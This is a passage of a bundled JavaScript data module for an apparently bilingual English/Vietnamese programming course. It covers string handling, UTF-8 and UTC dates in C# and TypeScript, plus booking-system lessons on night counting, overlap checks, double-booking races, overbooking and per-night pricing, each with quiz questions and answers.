name = name.ToUpper();    // now "LAN"`}},{type:"code",code:{lang:"csharp",text:`// Slow: each += copies the whole string
string csv = "";
foreach (var r in rows) csv += r + "\\n";

// Fast: one growing buffer
var sb = new StringBuilder();
foreach (var r in rows) sb.Append(r).Append('\\n');
// Or simply: string.Join("\\n", rows)
// TS: rows.join("\\n")`}},{type:"text",text:"**Unicode** gives every character a number. **UTF-8** stores that number in 1 to 4 bytes. English letters use 1 byte. Vietnamese letters with marks often use 2 or 3."},{type:"diagram",text:`text "Việt" in UTF-8
char:    V    i    ệ          t
bytes:   56   69   E1 BB 87   74
count:   1    1    3          1
4 characters → 6 bytes`},{type:"list",items:["A limit of 10 bytes is not a limit of 10 characters.","A smiley emoji has `length` 2 in TS and C#, because they count UTF-16 units.","Compare text with a clear rule. C#: `string.Equals(a, b, StringComparison.OrdinalIgnoreCase)`.","`ToUpper()` depends on the culture. In Turkish, the upper case of `i` is `İ`."]},{type:"text",text:`**Dates.** A moment in time (an order was paid) is different from a calendar date (a birthday).
Store moments in **UTC** (world time, no time zone). Convert to local time only when you show them.`},{type:"diagram",text:`Stored (UTC)      2026-03-05 18:30Z
Shown in Hanoi    2026-03-06 01:30 (UTC+7)
Shown in London   2026-03-05 18:30 (UTC+0)
same moment, different calendar day`},{type:"list",items:["C#: use `DateTime.UtcNow` or `DateTimeOffset`, not `DateTime.Now`, for stored times.",'Date-only values (birthday, holiday): C# `DateOnly`, or a `"2026-03-05"` string in TS.','TS: `new Date("2026-03-05")` means midnight UTC. In New York it shows March 4.']},{type:"example",title:"Sales on the wrong day",text:"A shop in Vietnam sells an order at 1:30 AM on March 6. It is stored as 18:30 UTC on March 5. The daily report groups by the UTC date. So the sale lands in the March 5 report."}],remember:"Build strings with join or StringBuilder. Store moments in UTC, show local time, keep dates as dates.",questions:[{id:"basics.text-dates.1",kind:"code",difficulty:"easy",prompt:"What does this C# print?",code:{lang:"csharp",text:`string city = "hanoi";
city.ToUpper();
Console.WriteLine(city);`},choices:["HANOI","hanoi","Hanoi","Compile error"],answer:1,why:"Strings are immutable. `ToUpper()` returns a new string, and this code throws it away. Write `city = city.ToUpper();`."},{id:"basics.text-dates.2",kind:"perf",difficulty:"medium",prompt:"A C# export builds a CSV of 50,000 rows with `csv += line` in a loop. It takes minutes and uses lots of memory. What is the best fix?",choices:["Use a `StringBuilder` or `string.Join` to build the text once","Run the loop with `Parallel.ForEach` so it uses more CPU cores","Make the rows shorter by cutting the text of the long columns","Call `GC.Collect()` inside the loop to free the old strings"],answer:0,why:"Each `+=` copies the whole string built so far. With 50,000 rows the copying grows huge. A `StringBuilder` appends into one growing buffer.",remember:"Strings in a loop → StringBuilder or Join."},{id:"basics.text-dates.3",kind:"debug",difficulty:"medium",prompt:'Users in the United States see their birthday one day early. The API sends `"1990-05-20"`. The page shows `new Date(value).toLocaleDateString()`. Why?',choices:["The date is read as midnight UTC, which is May 19 in the US","The API stores birthdays in the server's local time zone","Months in TS start at 0, so the month and day are shifted","The browser cache keeps an old copy of the user profile data"],answer:0,why:"A date-only ISO string is read as UTC midnight. West of UTC, that moment is still the day before. A birthday is a date, so do not turn it into a moment.",remember:"Date-only stays date-only. No time zone."},{id:"basics.text-dates.4",kind:"scenario",difficulty:"medium",prompt:"Your app has users in Vietnam and Japan. How should the server store the time an order was paid?",choices:["In UTC, and convert to each user's time zone when it is shown","In Vietnam time, because the company head office is in Hanoi","In the local time of each user, exactly as their device sent it",'As text such as "6 Mar 2026, 1:30 PM" so it is easy to display'],answer:0,why:"UTC is one clear reference for every moment. Sorting, comparing and reporting all work. Each screen converts to its own local time."},{id:"basics.text-dates.5",kind:"compare",difficulty:"hard",prompt:"C# login code must match an email, ignoring upper and lower case. Which is better?",choices:["`a.ToUpper() == b.ToUpper()`","`string.Equals(a, b, StringComparison.OrdinalIgnoreCase)`"],answer:1,why:"`ToUpper()` uses the current culture, so results can change by server settings, for example in Turkish. It also creates two new strings. The explicit comparison is clear and stable.",remember:"Say how to compare: OrdinalIgnoreCase."}]}],cheatSheet:[{title:"Types and values",items:[{term:"Static typing",meaning:"Types checked at build time (C#, TypeScript)"},{term:"Dynamic typing",meaning:"Types checked only while the program runs (JavaScript, Python)"},{term:'"1" + 1',meaning:'Joins text → "11". Convert input with Number() or TryParse first'},{term:"Value type",meaning:"Copying copies the data (C# int, struct; TS number, string)"},{term:"Reference type",meaning:"Copying copies the address; both names share one object"},{term:"Shallow copy",meaning:"{ ...obj } copies the top level; inner objects are still shared"}]},{title:"Missing values",items:[{term:"null / undefined",meaning:"No value. Reading a member of it crashes"},{term:"string?",meaning:"C# type that may be null; warnings at build time only"},{term:"a?.b",meaning:"Stop and give null/undefined if a is empty"},{term:"x ?? y",meaning:"y only when x is null or undefined"},{term:"x || y",meaning:'y also when x is 0, "" or false — often a bug'},{term:'"" vs null',meaning:"Empty text is not missing text. Pick one meaning"}]},{title:"Loops and functions",items:[{term:"i < length",meaning:"Last index is length - 1; <= goes one too far"},{term:"Fencepost",meaning:"4 sections need 5 posts. Check both ends"},{term:"Range rule",meaning:"Include the start, exclude the end"},{term:"Early return",meaning:"Handle special cases first, keep the main path flat"},{term:"Pure function",meaning:"Same input, same output, no side effects"},{term:"Closure",meaning:"Remembers outer variables — the variable, not its value"}]},{title:"Numbers",items:[{term:"Overflow",meaning:"int.MaxValue + 1 wraps to a negative number. Use long"},{term:"7 / 2 in C#",meaning:"3 — int / int cuts off decimals"},{term:"0.1 + 0.2",meaning:"0.30000000000000004 in double / TS number"},{term:"Money",meaning:"C# decimal, SQL DECIMAL, or whole minor units (cents)"},{term:"Math.Round(2.5)",meaning:"2 in C# (banker's rounding), 3 with Math.round in TS"}]},{title:"Text and dates",items:[{term:"Immutable string",meaning:"Methods return a new string; assign the result"},{term:"StringBuilder / join",meaning:"Build big text in a loop without copying"},{term:"UTF-8",meaning:"1–4 bytes per character; bytes ≠ characters"},{term:"OrdinalIgnoreCase",meaning:"Clear, culture-free case-insensitive compare in C#"},{term:"UTC",meaning:"Store moments in UTC, show local time"},{term:"DateOnly",meaning:"Birthdays and holidays: a date with no time zone"}]}]},p=Object.freeze(Object.defineProperty({__proto__:null,default:u},Symbol.toStringTag,{value:"Module"})),g={id:"booking",group:"domain",title:"Booking & Reservations",emoji:"🏨",tagline:`Hotels, flights, clinics, cinemas: selling time and seats.
VI: Khách sạn, vé máy bay, phòng khám, rạp phim: bán thời gian và chỗ ngồi.`,lessons:[{id:"booking.selling-time",title:"Selling time · Bán thời gian",summary:`What is booked, how to count nights, and how to spot an overlap.
VI: Bán cái gì, đếm số đêm thế nào và nhận biết hai lượt đặt bị trùng.`,minutes:4,blocks:[{type:"text",text:`In booking, you sell **one unit of capacity for a period of time**. When that time passes, an unsold unit is lost forever.
VI: Trong nghiệp vụ đặt chỗ, bạn bán **một đơn vị sức chứa trong một khoảng thời gian**. Hết thời gian đó, chỗ chưa bán được coi như mất luôn.`},{type:"diagram",text:`┌──────────┬────────────┬─────────────┐
│ Business │ Unit       │ Time        │
├──────────┼────────────┼─────────────┤
│ Hotel    │ room       │ per night   │
│ Cinema   │ seat       │ per show    │
│ Clinic   │ doctor     │ per slot    │
│ Airline  │ seat       │ per flight  │
└──────────┴────────────┴─────────────┘`},{type:"text",text:`Hotels count **nights**, not days. Nights = check-out date minus check-in date.
VI: Khách sạn tính theo **đêm**, không tính theo ngày. Số đêm = ngày trả phòng trừ ngày nhận phòng.`},{type:"diagram",text:` 14 Jun      15 Jun      16 Jun
   │           │           │
   ├─ night 1 ─┼─ night 2 ─┤
   ▲                       ▲
 check-in              check-out
 (nhận phòng)          (trả phòng)

 nights = 16 - 14 = 2`},{type:"text",text:"Store a stay as a **half-open interval** `[CheckIn, CheckOut)`. The start date is inside the stay. The end date is not. So guest A can leave on 16 Jun and guest B can arrive on 16 Jun.\nVI: Lưu kỳ lưu trú dạng **khoảng nửa mở** `[CheckIn, CheckOut)`. Ngày bắt đầu thuộc kỳ ở, ngày kết thúc thì không. Nhờ vậy khách A trả phòng ngày 16/6 và khách B nhận phòng cùng ngày đó mà không bị trùng."},{type:"code",code:{lang:"ts",text:`// Half-open: [start, end)
function overlaps(a: Stay, b: Stay): boolean {
  return a.start < b.end && b.start < a.end;
}
// A = 14→16, B = 16→18
// 14 < 18 && 16 < 16 → false: no overlap`}},{type:"code",code:{lang:"sql",text:`-- Is room 101 free for 14→16 Jun?
SELECT COUNT(*) FROM Booking
WHERE RoomId = 101
  AND Status IN ('Held', 'Confirmed')
  AND CheckIn  < '2026-06-16'  -- new end
  AND CheckOut > '2026-06-14'; -- new start
-- 0 → the room is free`}},{type:"example",title:"Clinic slots",text:"Dr. Lan has 15-minute slots: 09:00–09:15 and 09:15–09:30. They touch but do not overlap. A check with `<=` instead of `<` says they clash. Then half of her day looks full.\nVI: Bác sĩ Lan có các khung khám 15 phút: 09:00–09:15 và 09:15–09:30. Hai khung chạm nhau nhưng không chồng lên nhau. Nếu dùng `<=` thay cho `<`, hệ thống báo trùng và nửa ngày làm việc của bác sĩ bị hiện là đã kín."},{type:"list",items:[`What is the smallest unit we sell: a night, an hour, a 15-minute slot?
VI: Đơn vị nhỏ nhất mình bán là gì: một đêm, một giờ hay một khung 15 phút?`,`Can one room have a check-out and a check-in on the same day?
VI: Một phòng có được trả và nhận khách mới trong cùng một ngày không?`,`Do we need a cleaning gap between two bookings?
VI: Có cần chừa thời gian dọn phòng giữa hai lượt đặt không?`]}],remember:"Store bookings as `[start, end)`. Two bookings clash only if `a.start < b.end` and `b.start < a.end`.\nVI: Lưu lượt đặt dạng `[start, end)`. Hai lượt đặt chỉ trùng khi `a.start < b.end` và `b.start < a.end`.",questions:[{id:"booking.selling-time.1",kind:"mcq",difficulty:"easy",prompt:`A guest checks in on 20 Dec and checks out on 23 Dec. How many nights does the hotel charge?
VI: Khách nhận phòng ngày 20/12 và trả phòng ngày 23/12. Khách sạn tính bao nhiêu đêm?`,choices:["2 nights","3 nights","4 nights"],answer:1,why:`Nights = 23 − 20 = 3: the nights of 20, 21 and 22 Dec. The check-out day is not a night of the stay.
VI: Số đêm = 23 − 20 = 3, gồm đêm 20, 21 và 22/12. Ngày trả phòng không phải là một đêm lưu trú.`},{id:"booking.selling-time.2",kind:"code",difficulty:"medium",prompt:"A clinic uses this check. What does `clash(A, B)` return, and is it right?\nVI: Phòng khám dùng hàm kiểm tra này. `clash(A, B)` trả về gì, và kết quả đó có đúng không?",code:{lang:"ts",text:`function clash(a: Slot, b: Slot) {
  return a.start <= b.end && b.start <= a.end;
}
// A = 09:00–09:15, B = 09:15–09:30`},choices:["true, and it is wrong: the slots only touch","false, and it is right: there is no overlap","true, and it is right: both slots use 09:15","false, and it is wrong: they share a minute"],answer:0,why:"`09:15 <= 09:15` is true, so the function says they clash. With half-open slots, A ends exactly when B starts. Use `<` to allow back-to-back slots.\nVI: `09:15 <= 09:15` là đúng nên hàm báo trùng. Với khung nửa mở, A kết thúc đúng lúc B bắt đầu. Dùng `<` để cho phép hai khung liền nhau."},{id:"booking.selling-time.3",kind:"debug",difficulty:"medium",prompt:`Guest A has room 101 from 14 to 16 Jun. Guest B tries to book room 101 from 16 to 18 Jun. The site says "not available". What is the most likely bug?
VI: Khách A ở phòng 101 từ 14 đến 16/6. Khách B đặt phòng 101 từ 16 đến 18/6 thì web báo "hết phòng". Lỗi nào khả năng cao nhất?`,choices:["The query uses `CheckOut >= newStart`, not `>`","The database stores dates in UTC, not local time","Room 101 needs a cleaning gap of one full day","The hotel has no free rooms at all on 16 Jun"],answer:0,why:"With `>=`, A's check-out date (16) counts as taken, so B looks like a clash. The end date must be excluded: `CheckOut > newStart`.\nVI: Với `>=`, ngày trả phòng của A (16) bị coi là đã có khách, nên B bị báo trùng. Phải loại ngày kết thúc: `CheckOut > newStart`."},{id:"booking.selling-time.4",kind:"truefalse",difficulty:"hard",prompt:`To know a room is free, it is enough to find bookings that **start** inside the new dates.
VI: Để biết phòng còn trống cho kỳ ở mới, chỉ cần tìm các lượt đặt **bắt đầu** trong khoảng thời gian của kỳ ở mới.`,choices:["True","False"],answer:1,why:`A booking that started earlier can still run across the new dates. For example, 10→20 Jun blocks a new stay of 14→16 Jun. Use the full overlap check.
VI: Một lượt đặt bắt đầu sớm hơn vẫn có thể kéo dài qua các ngày mới. Ví dụ 10→20/6 chặn kỳ ở mới 14→16/6. Hãy dùng đủ điều kiện kiểm tra trùng.`}]},{id:"booking.availability",title:"Availability and double booking · Chỗ trống và đặt trùng",summary:`Two people, one last room, the same second.
VI: Hai người, một phòng cuối cùng, cùng một giây.`,minutes:5,blocks:[{type:"text",text:`**Availability** is capacity minus what is already taken. The math is easy. The hard part is two users acting at the same moment.
VI: **Chỗ trống** là sức chứa trừ đi số đã bán. Phép tính thì dễ. Cái khó là hai người cùng thao tác vào một thời điểm.`},{type:"diagram",text:`Last room: 1 left
time  User A           User B
 t1   check → 1 free
 t2                    check → 1 free
 t3   INSERT booking
 t4                    INSERT booking
 t5   2 bookings for 1 room ✗
      = double booking (đặt trùng)`},{type:"text",text:`This is a **race condition**: the result depends on timing. "Check, then insert" as two steps is not safe. Another request can run between them.
VI: Đây là **race condition** (tranh chấp đồng thời): kết quả phụ thuộc vào thời điểm. "Kiểm tra rồi mới ghi" theo hai bước là không an toàn. Một yêu cầu khác có thể chen vào giữa.`},{type:"text",text:"Let the database decide in one step. For seats, a **unique index** on `(ShowId, SeatNo)` makes the second insert fail. For room types, keep one stock row per night and update it with a condition.\nVI: Hãy để database quyết định trong một bước. Với ghế, **unique index** trên `(ShowId, SeatNo)` làm lần ghi thứ hai bị lỗi. Với loại phòng, giữ một dòng tồn cho mỗi đêm và cập nhật kèm điều kiện."},{type:"code",code:{lang:"sql",text:`-- One row per room type per night
UPDATE RoomInventory
SET Sold = Sold + 1
WHERE RoomTypeId = 5
  AND StayDate = '2026-06-14'
  AND Sold < Capacity;
-- 0 rows updated → sold out, roll back
-- Run it for every night, in 1 transaction`}},{type:"text",text:`While the user pays, the seat is **held** (giữ chỗ). A hold has an expiry time, for example 10 minutes. If payment does not finish, the seat goes back on sale.
VI: Trong lúc khách thanh toán, ghế được **giữ chỗ**. Lượt giữ có thời hạn, ví dụ 10 phút. Nếu thanh toán không xong, ghế được mở bán lại.`},{type:"diagram",text:`Pick seat ──► Held (until 10:10)
                    │
          ┌─────────┴─────────┐
     paid by 10:10       not paid
          ▼                   ▼
      Confirmed       Expired → seat free`},{type:"example",title:"The slow payment",text:`A cinema app holds seats E5 and E6 for 10 minutes. The user opens the bank app and returns after 12 minutes. Another user has bought E5. The system must not take money for a seat it cannot give.
VI: Ứng dụng rạp phim giữ ghế E5 và E6 trong 10 phút. Khách mở app ngân hàng và quay lại sau 12 phút. Người khác đã mua ghế E5. Hệ thống không được thu tiền cho một ghế không còn giao được.`},{type:"list",items:[`How long is a hold? Do we show a countdown to the user?
VI: Giữ chỗ bao lâu? Có hiện đồng hồ đếm ngược cho khách không?`,`If the payment succeeds after the hold expired, do we re-check or refund?
VI: Nếu thanh toán thành công sau khi hết giữ chỗ thì kiểm tra lại hay hoàn tiền?`,"The availability query must ignore holds with `ExpiresAt < now`, even before a cleanup job runs.\nVI: Câu truy vấn chỗ trống phải bỏ qua lượt giữ có `ExpiresAt < now`, kể cả khi job dọn dẹp chưa chạy."]}],remember:`Never "check, then insert" in two steps. Let one atomic database step decide who gets the last unit.
VI: Đừng "kiểm tra rồi mới ghi" theo hai bước. Hãy để một thao tác nguyên tử trong database quyết định ai lấy chỗ cuối cùng.`,questions:[{id:"booking.availability.1",kind:"scenario",difficulty:"medium",prompt:`The code first counts free rooms, and if the count is above 0, it inserts a booking. During a sale, two guests get the last room. What is the best fix?
VI: Code đếm phòng trống trước, nếu lớn hơn 0 thì ghi lượt đặt. Trong đợt khuyến mãi, hai khách cùng lấy được phòng cuối. Cách sửa tốt nhất là gì?`,choices:["Wait one second, then check again before the insert","Check availability twice in the application code","Do the check and the insert as one atomic DB step","Cache availability so that each check is faster"],answer:2,why:`Any gap between check and insert lets another request slip in. A conditional update or a unique index makes the database decide once.
VI: Bất kỳ khoảng hở nào giữa kiểm tra và ghi đều cho yêu cầu khác chen vào. Lệnh update có điều kiện hoặc unique index giúp database quyết định một lần duy nhất.`},{id:"booking.availability.2",kind:"code",difficulty:"medium",prompt:"`Sold` is 9 and `Capacity` is 10. Two requests run this at the same moment. What happens?\nVI: `Sold` đang là 9, `Capacity` là 10. Hai yêu cầu chạy lệnh này cùng lúc. Chuyện gì xảy ra?",code:{lang:"sql",text:`UPDATE RoomInventory
SET Sold = Sold + 1
WHERE RoomTypeId = 5
  AND StayDate = '2026-06-14'
  AND Sold < Capacity;`},choices:["Both update 1 row, and Sold becomes 11","One updates 1 row, the other updates 0 rows","Both fail, because the row is locked","Both update 0 rows, and the room stays free"],answer:1,why:"The database runs the two updates one after the other on that row. The second one sees `Sold = 10`, so its condition fails and it changes 0 rows.\nVI: Database xử lý lần lượt hai lệnh update trên dòng đó. Lệnh thứ hai thấy `Sold = 10`, điều kiện sai nên không cập nhật dòng nào."},{id:"booking.availability.3",kind:"debug",difficulty:"hard",prompt:`Seats often show "sold out", then many become free at once on the hour. Expired holds are deleted by a job that runs every hour. What is the bug?
VI: Ghế hay hiện "hết chỗ", rồi đến đầu giờ lại trống nhiều cùng lúc. Lượt giữ hết hạn được xóa bởi một job chạy mỗi giờ. Lỗi ở đâu?`,choices:["The payment gateway is too slow at peak hours","The job deletes holds that are still being paid","The cinema has too few seats for its customers","The availability query still counts expired holds"],answer:3,why:"A hold past its `ExpiresAt` is no longer valid. The query must ignore it, and not wait for the cleanup job.\nVI: Lượt giữ đã quá `ExpiresAt` không còn hiệu lực. Câu truy vấn phải bỏ qua nó ngay, không chờ job dọn dẹp."},{id:"booking.availability.4",kind:"truefalse",difficulty:"easy",prompt:`A hold should keep the seat blocked until the user pays, however long that takes.
VI: Lượt giữ chỗ nên khóa ghế cho đến khi khách thanh toán, dù mất bao lâu.`,choices:["True","False"],answer:1,why:`A hold without an end lets one slow or gone user block a seat forever. Every hold needs an expiry time.
VI: Giữ chỗ không thời hạn khiến một khách chậm hoặc bỏ đi chặn ghế mãi mãi. Mọi lượt giữ đều cần thời điểm hết hạn.`}]},{id:"booking.overbooking",title:"Overbooking and no-shows · Bán vượt và khách không đến",summary:`Selling more than you have, on purpose.
VI: Cố ý bán nhiều hơn số chỗ đang có.`,minutes:4,blocks:[{type:"text",text:`A **no-show** is a guest who books but never comes. Airlines and hotels expect some no-shows. So some of them sell more than their capacity on purpose. This is **overbooking**.
VI: **No-show** là khách đã đặt nhưng không đến. Hãng bay và khách sạn biết trước sẽ có một số khách như vậy. Nên có nơi cố ý bán vượt sức chứa. Đó là **overbooking** (bán vượt).`},{type:"diagram",text:`Capacity:          100 rooms
No-show rate:      about 5% (example)
Overbook limit:    +4  → sell up to 104

One night, 104 sold:
 Case A: 6 no-shows → 98 guests
         2 rooms empty
 Case B: 3 no-shows → 101 guests
         1 guest has no room ✗`},{type:"text",text:`If about 5% do not come, 100 bookings fill about 95 rooms. A few extra bookings fill the gap. But it is a bet, not a promise.
VI: Nếu khoảng 5% khách không đến, 100 lượt đặt chỉ lấp khoảng 95 phòng. Bán thêm vài lượt sẽ lấp chỗ trống. Nhưng đây là đặt cược, không phải chắc chắn.`},{type:"example",title:"When everyone comes",text:`A hotel may send the extra guest to a nearby hotel and pay for the room and taxi. An airline may ask for volunteers to take a later flight. Some countries have rules for this.
VI: Khách sạn có thể chuyển khách dư sang khách sạn gần đó và trả tiền phòng, tiền taxi. Hãng bay có thể mời khách tình nguyện bay chuyến sau. Một số nước có quy định riêng cho việc này.`},{type:"text",text:`The system must know the rule. Store an **overbooking limit** per room type and date. Do not hide a "+5" inside the code.
VI: Hệ thống phải biết rõ quy tắc này. Hãy lưu **mức bán vượt** theo loại phòng và theo ngày. Đừng giấu một con số "+5" trong code.`},{type:"code",code:{lang:"text",text:`RoomInventory(RoomTypeId, StayDate,
  Capacity, OverbookLimit, Sold)

can sell when:
  Sold < Capacity + OverbookLimit

real rooms for the front desk = Capacity`}},{type:"compare",left:{title:"Sales channels see",items:[`Up to 104 rooms to sell
VI: Được bán tối đa 104 phòng`,`"Available" until 104 are sold
VI: Hiện "còn phòng" đến khi bán đủ 104`]},right:{title:"Front desk sees",items:[`Only 100 real room numbers
VI: Chỉ có 100 số phòng thật`,`A list of guests who may need to move
VI: Danh sách khách có thể phải chuyển đi`]}},{type:"list",items:[`Which products allow overbooking? Assigned cinema seats cannot.
VI: Sản phẩm nào được bán vượt? Ghế rạp phim có số ghế cố định thì không được.`,`Is the limit a fixed number or a percent? Who can change it?
VI: Mức bán vượt là số cố định hay phần trăm? Ai được sửa?`,`Who decides which guest is moved? Are some guests never moved?
VI: Ai quyết định chuyển khách nào? Có khách nào không bao giờ bị chuyển không?`]}],remember:`Overbooking is a business rule with a number. Store it as data, and plan what happens when everyone comes.
VI: Bán vượt là quy tắc kinh doanh có con số cụ thể. Hãy lưu nó thành dữ liệu và chuẩn bị phương án khi mọi khách đều đến.`,questions:[{id:"booking.overbooking.1",kind:"mcq",difficulty:"easy",prompt:`Why do some hotels sell more rooms than they have, on purpose?
VI: Vì sao một số khách sạn cố ý bán nhiều phòng hơn số phòng đang có?`,choices:["To fill rooms that no-shows would leave empty","To make the website look busy and popular","Because the system cannot count rooms well","To pay less tax on the rooms that stay empty"],answer:0,why:`Some guests never come. Selling a few extra rooms keeps the hotel full on most nights.
VI: Luôn có khách đặt mà không đến. Bán thêm vài phòng giúp khách sạn kín phòng trong hầu hết các đêm.`},{id:"booking.overbooking.2",kind:"mcq",difficulty:"medium",prompt:`A plane has 200 seats. The airline sold 206 tickets. 4 people do not come. How many passengers have no seat?
VI: Máy bay có 200 ghế. Hãng đã bán 206 vé. Có 4 người không đến. Bao nhiêu hành khách không có ghế?`,choices:["0","2","4","6"],answer:1,why:`206 − 4 = 202 people come for 200 seats. So 2 passengers have no seat.
VI: 206 − 4 = 202 người đến cho 200 ghế. Vậy có 2 hành khách không có ghế.`},{id:"booking.overbooking.3",kind:"compare",difficulty:"medium",prompt:`Where should the overbooking rule live?
VI: Quy tắc bán vượt nên được lưu ở đâu?`,choices:["In the code: `capacity * 1.05` in the booking service\nVI: Trong code: `capacity * 1.05` ở booking service",`In data: a limit per room type and date that staff can change
VI: Trong dữ liệu: mức giới hạn theo loại phòng và ngày, nhân viên sửa được`],answer:1,why:`The right limit changes by date and season. As data, the business can adjust it and the front desk can see it. A hidden formula needs a deploy for every change.
VI: Mức hợp lý thay đổi theo ngày và theo mùa. Lưu thành dữ liệu thì nghiệp vụ tự chỉnh được và lễ tân nhìn thấy được. Công thức giấu trong code thì mỗi lần đổi phải deploy lại.`},{id:"booking.overbooking.4",kind:"debug",difficulty:"hard",prompt:`A "sell 5% extra" setting was switched on for all products. Now cinema customers find someone else in their seat. Why is the rule wrong here?
VI: Cài đặt "bán thêm 5%" được bật cho mọi sản phẩm. Giờ khách xem phim đến nơi thì ghế đã có người ngồi. Vì sao quy tắc này sai ở đây?`,choices:["Each seat number is a specific unit, sold only once","Cinemas have a higher no-show rate than hotels","The setting should be 3% for cinemas, not 5%","Cinema seats are held for too short a time"],answer:0,why:`A hotel can give any free room of the same type. A seat number like E5 cannot be swapped quietly, so selling it twice is a real conflict.
VI: Khách sạn có thể giao bất kỳ phòng trống nào cùng loại. Ghế có số như E5 thì không đổi ngầm được, nên bán hai lần là xung đột thật.`}]},{id:"booking.pricing",title:"Pricing by date · Giá theo ngày",summary:`Each night has its own price. The stay costs the sum.
VI: Mỗi đêm có giá riêng. Giá cả kỳ ở là tổng các đêm.`,minutes:4,blocks:[{type:"text",text:`Hotel prices change **per night**. Weekends, high season and holidays like Tết can cost more. So a stay costs the **sum of its nights**, not nights × one price.
VI: Giá phòng thay đổi **theo từng đêm**. Cuối tuần, mùa cao điểm và dịp lễ như Tết có thể đắt hơn. Vì vậy giá cả kỳ ở là **tổng giá các đêm**, không phải số đêm × một mức giá.`},{type:"diagram",text:`Deluxe room, price per night (VND)
┌─────────┬─────────┬─────────┬─────────┐
│Thu 11/6 │Fri 12/6 │Sat 13/6 │Sun 14/6 │
├─────────┼─────────┼─────────┼─────────┤
│1,500,000│2,000,000│2,000,000│1,500,000│
└─────────┴─────────┴─────────┴─────────┘
Stay: check-in Thu, check-out Sun
Nights: Thu + Fri + Sat (not Sun)
Total: 1.5M + 2M + 2M = 5,500,000`},{type:"code",code:{lang:"ts",text:`let total = 0;
let d = checkIn;
while (d < checkOut) {        // [in, out)
  total += rateFor(roomTypeId, d);
  d = addDays(d, 1);
}
// 1,500,000 + 2,000,000 + 2,000,000`}},{type:"text",text:`Show **taxes and fees up front**, before the payment page. In Vietnam, a price like "1,500,000++" often means service fee and VAT are not included yet.
VI: Hãy hiện **thuế và phí ngay từ đầu**, trước trang thanh toán. Ở Việt Nam, giá ghi "1.500.000++" thường nghĩa là chưa gồm phí phục vụ và VAT.`},{type:"example",title:"The total the guest sees",text:`Room for 3 nights: 5,500,000. VAT, for example 10%: 550,000. Total: 6,050,000 VND. Show this total on the search result, not only at the last step.
VI: Tiền phòng 3 đêm: 5.500.000. VAT, ví dụ 10%: 550.000. Tổng: 6.050.000 VND. Hãy hiện tổng này ngay ở kết quả tìm kiếm, không chỉ ở bước cuối.`},{type:"text",text:`**Lock the price at booking time.** Copy the price of each night onto the booking. If the hotel raises prices tomorrow, this booking does not change.
VI: **Chốt giá tại thời điểm đặt.** Sao chép giá từng đêm vào lượt đặt. Nếu ngày mai khách sạn tăng giá, lượt đặt này vẫn giữ nguyên.`},{type:"code",code:{lang:"text",text:`RatePlan(Id, RoomTypeId, Name)
DailyRate(RatePlanId, StayDate, Price)
Booking(Id, CheckIn, CheckOut,
  Total, Currency, Status)
BookingNight(BookingId, StayDate,
  Price)   -- copy, frozen at booking`}},{type:"list",items:[`Which nights are "weekend": Friday and Saturday, or Saturday and Sunday?
VI: Đêm nào tính giá cuối tuần: thứ Sáu và thứ Bảy, hay thứ Bảy và Chủ nhật?`,`Are the prices we store with or without VAT and service fee?
VI: Giá lưu trong hệ thống đã gồm VAT và phí phục vụ chưa?`,`If the price changes between search and payment, which price does the guest pay?
VI: Nếu giá đổi giữa lúc tìm kiếm và lúc thanh toán, khách trả theo giá nào?`]}],remember:`Price of a stay = sum of each night's price, saved on the booking at booking time.
VI: Giá kỳ ở = tổng giá từng đêm, được lưu vào lượt đặt ngay lúc đặt.`,questions:[{id:"booking.pricing.1",kind:"mcq",difficulty:"easy",prompt:`Prices per night: Thu 1.5M, Fri 2M, Sat 2M, Sun 1.5M. The guest checks in Thursday and checks out Sunday. What is the room total?
VI: Giá mỗi đêm: thứ Năm 1,5 triệu, thứ Sáu 2 triệu, thứ Bảy 2 triệu, Chủ nhật 1,5 triệu. Khách nhận phòng thứ Năm, trả phòng Chủ nhật. Tổng tiền phòng là bao nhiêu?`,choices:["4,500,000","5,500,000","6,000,000","7,000,000"],answer:1,why:`The nights are Thursday, Friday and Saturday: 1.5M + 2M + 2M = 5.5M. Sunday is the check-out day, so it is not charged.
VI: Các đêm là thứ Năm, thứ Sáu, thứ Bảy: 1,5 + 2 + 2 = 5,5 triệu. Chủ nhật là ngày trả phòng nên không tính tiền.`},{id:"booking.pricing.2",kind:"code",difficulty:"medium",prompt:`A guest stays Thursday to Sunday. What is wrong with this code?
VI: Khách ở từ thứ Năm đến Chủ nhật. Đoạn code này sai ở đâu?`,code:{lang:"ts",text:`const nights = daysBetween(checkIn, checkOut);
const total = nights * rateFor(roomTypeId, checkIn);`},choices:["It counts 4 nights instead of 3 nights","It adds the Sunday price to the total","It uses the Thursday price for every night","Nothing; it returns the right total"],answer:2,why:`It multiplies the first night's price by 3, so the guest pays 4.5M instead of 5.5M. Sum the price of each night instead.
VI: Code nhân giá đêm đầu cho 3 đêm, nên khách chỉ trả 4,5 triệu thay vì 5,5 triệu. Phải cộng giá của từng đêm.`},{id:"booking.pricing.3",kind:"debug",difficulty:"hard",prompt:`The hotel raised prices for next month. Now the totals of many old bookings for next month changed too. What is the most likely cause?
VI: Khách sạn tăng giá cho tháng sau. Giờ tổng tiền của nhiều lượt đặt cũ trong tháng sau cũng bị đổi. Nguyên nhân khả năng cao nhất là gì?`,choices:["Totals are read from DailyRate, not the saved nights","The new prices were saved in the wrong currency","The booking dates were moved by a time zone bug","The hotel cancelled and rebooked those bookings"],answer:0,why:"A booking must keep the prices from booking time. Reading the live `DailyRate` table lets every price change rewrite old bookings.\nVI: Lượt đặt phải giữ giá tại thời điểm đặt. Đọc trực tiếp bảng `DailyRate` khiến mỗi lần đổi giá lại sửa luôn các lượt đặt cũ."},{id:"booking.pricing.4",kind:"compare",difficulty:"medium",prompt:`Which way of showing the price is better for the guest and for the hotel?
VI: Cách hiện giá nào tốt hơn cho cả khách và khách sạn?`,choices:[`Show the room price; add VAT and fees on the payment page
VI: Hiện giá phòng; cộng VAT và phí ở trang thanh toán`,`Show the total with VAT and fees before the payment page
VI: Hiện tổng đã gồm VAT và phí trước trang thanh toán`],answer:1,why:`A price that jumps at the last step feels like a trick. Guests leave or complain. A clear total early builds trust.
VI: Giá bị đội lên ở bước cuối khiến khách thấy bị lừa. Khách sẽ bỏ đi hoặc phàn nàn. Hiện rõ tổng tiền từ sớm giúp tạo niềm tin.`}]},{id:"booking.cancellations",title:"Changes, cancellations and refunds · Đổi, hủy và hoàn tiền",summary:`How much money comes back, and how a booking moves between statuses.
VI: Khách được hoàn bao nhiêu tiền, và lượt đặt chuyển trạng thái thế nào.`,minutes:5,blocks:[{type:"text",text:`A **cancellation policy** says how much money the guest gets back. It usually depends on how early the guest cancels.
